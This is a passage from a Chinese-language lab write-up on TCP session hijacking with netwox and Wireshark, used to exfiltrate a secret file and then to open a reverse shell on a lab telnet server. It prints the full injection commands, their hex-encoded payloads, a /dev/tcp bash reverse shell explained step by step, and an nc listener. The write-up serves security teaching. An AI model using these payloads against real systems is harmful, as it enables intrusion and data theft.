进入`Edit preferences`-->  右侧边栏的`Pritocols`--> 下滑到` TCP`-->  取消`Relative sequence numbers`选项-->`OK`

![image-20220309081640049](TCPIPAttackLab/image-20220309081640049.png)

![image-20220309083524232](TCPIPAttackLab/image-20220309083524232.png)

> 此任务对应的 Net wox 工具编号为 40。这是这个工具的帮助屏幕的一部分。您还可以键入`“net wox40—— help”`以获得完整的帮助信息。 您可能还需要使用 Wireshark 来查找构建欺骗 TCP 数据包的正确参数。

netwox tool 40 的部分用法:

```shell
Title: Spoof Ip4Tcp packet
    Usage: netwox 40 [-l ip] [-m ip] [-o port] [-p port] [-q uint32] [-B]
    Parameters:
    -l|--ip4-src ip IP4 src {192.168.136.136}
    -m|--ip4-dst ip IP4 dst {192.168.136.137}
    -o|--tcp-src port TCP src {57341}
    -p|--tcp-dst port TCP dst {23}
    -q|--tcp-seqnum uint32 TCP seqnum (rand if unset) {104}
    -H|--tcp-data mixed_data mixed data
```

依次修改为本次TCP的参数，netwox 40需要root权限

```bash
sudo netwox 40 --ip4-src 192.168.136.132 --ip4-dst 192.168.136.136 --tcp-src 41754 --tcp-dst 23 --tcp-seqnum 1232486293 --tcp-acknum 615320578 --tcp-window 156 --tcp-data '0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f3139322e3136382e3133362e3133302f39303930200d'
```

![image-20220309090137664](TCPIPAttackLab/image-20220309090137664.png)

在攻击机的监听端口，我们收到了secret的内容

![image-20220309083935997](TCPIPAttackLab/image-20220309083935997.png)

WireShark也检测到了本次连接。

![image-20220309084710348](TCPIPAttackLab/image-20220309084710348.png)

## 任务 5：使用 TCP 会话劫持创建反向shell

在任务4的TCP 会话劫持攻击中，攻击者不能直接在受害者机器上运行命令，因此接下来我们将通过会话劫持攻击运行反向 shell 命令。

> 当攻击者能够使用 TCP 会话劫持向受害者的机器注入命令时，他们对在受害者机器上运行一个简单命令不感兴趣；他们对运行许多命令感兴趣。 显然，通过 TCP 会话劫持运行这些命令是不方便的。 攻击者想要实现的是利用攻击设置后门，这样他们就可以利用这个后门方便地进行进一步的破坏。 
>
> 设置后门的一个典型方法是从受害者机器运行一个反向外壳，使攻击的外壳访问受害者机器。 反向 shell是在远程机器上运行的 shell 进程，连接回攻击者的机器。一旦成功，这将为攻击者提供了一种方便的方法来访问远程机器。如果我们成功设置反向 shell。 我们可以直接在**受害者机器**上运行命令(**seed2 服务器机器**)。

使用 netcat 监听连接

![image-20220309091251968](TCPIPAttackLab/image-20220309091251968.png)

运行反向外壳

![image-20220309091306381](TCPIPAttackLab/image-20220309091306381.png)

netcat(简称 nc)用于侦听端口 9090 上的连接。

> **标准输出设备**。在绘会话劫持中已经介绍了如何使用一个TCP伪设备重定向cat命令的输出到另一个主机的tcp服务中。为了得到反向shell，可以执行如下命令，即使用tcp为设备作为Bash程序的标准输出设备。
>
> ```bash
> /bin/bash -i > /dev/tcp/攻击者IP/9090
> ```
>
> **标准错误设备**。上面的命令是不够的。Bash程序的输出，不仅使用标准输出设备，也使用标准错误设备。因此，需要重定向标准错误设备到TCP伪设备，这可以通过在命令结尾附加`2>&1`来实现。在UNIX系统中，标准输入、输出以及错误设备分别由文件描述符0、1、2标识。通过重定向标准错误设备到文件描述符1，程序也可以使用标准输出设备来输出错误信息。因为标准输出设备已经重定向到tcp伪设备，因此Bash输出的所有货物信息也将会被发送到tcp连接更新后的命令如下：
>
> ```bash
> /bin/bash -i > /dev/tcp/攻击者IP/9090 2>&1
> ```
>
> **标准输入设备**。如果试图在攻击者端的shell程序中输入内容。不会得到任何反馈，这是因为缺少对shell设备的控制。因此，服务器中的shell程序依旧从本地输入设备中得到输入，这也是依然可以在服务器中输入命令的原因。为了能够让shell程序从TCP伪设备得到输入。可以在命令后附加符号，符号。这表示使用文本描述符为1的设备作为输入设备(文件描述符为0)。更新后的命令如下所示：
>
> ```absh
>  /bin/bash -i > /dev/tcp/攻击者IP/9090 2>&1 0<&1
> ```

> `/bin/bash` 命令表示通常在受损服务器上执行的命令。 此命令有以下几个部分： 
>
> - `/bin/bash-i`：i 代表交互式，意思是 shell 必须是交互式的(必须提供 shell 提示)
>
> - `\>/dev/tcp/192.168.136.130/9090`：其作用是将 shell 的**输出**(stdout)重定向到 TCP 连接到 192.168.136.130(攻击机)的9090端口。 输出 stdout 用文件描述符编号 1 表示。
> - `0<&1`: 文件描述符 0 表示**标准输入**(stdin)。 这导致外壳的 stdin 从 tcp 连接中获得。
> - `2>&1`:文件描述符 2 表示**标准错误** stderr。 这导致错误输出被重定向到 TCP 连接

将命令转码

```bash
# python2
'\r /bin/bash -i > /dev/tcp/攻击者IP/9090 2>&1 0<&1 \r'.encode('hex')

# python3
'\r /bin/bash -i > /dev/tcp/攻击者IP/9090 2>&1 0<&1 \r'.encode("utf-8").hex()
```

```bash
'0d202f62696e2f62617368202d69203e202f6465762f7463702f3139322e3136382e3133362e3133302f3930393020323e263120303c2631200d'
```

再次开始监听

```bash
nc -lv 9090
```

任务4的方式故技重施，用户与服务器先正常通讯一次（如，ls，whoami），再抓最后一个包，改数据

![image-20220309093506245](TCPIPAttackLab/image-20220309093506245.png)

```bash
sudo netwox 40 --ip4-src 192.168.136.132 --ip4-dst 192.168.136.136 --tcp-src 41758 --tcp-dst 23 --tcp-seqnum 1028117725 --tcp-acknum 830188691 --tcp-window 501 --tcp-data '0d202f62696e2f62617368202d69203e202f6465762f7463702f3139322e3136382e3133362e3133302f3930393020323e263120303c2631200d'
```

![image-20220309092810780](TCPIPAttackLab/image-20220309092810780.png)

发现攻击成功，主机的监听端口可以执行seed2的命令。

![image-20220309092956962](TCPIPAttackLab/image-20220309092956962.png)

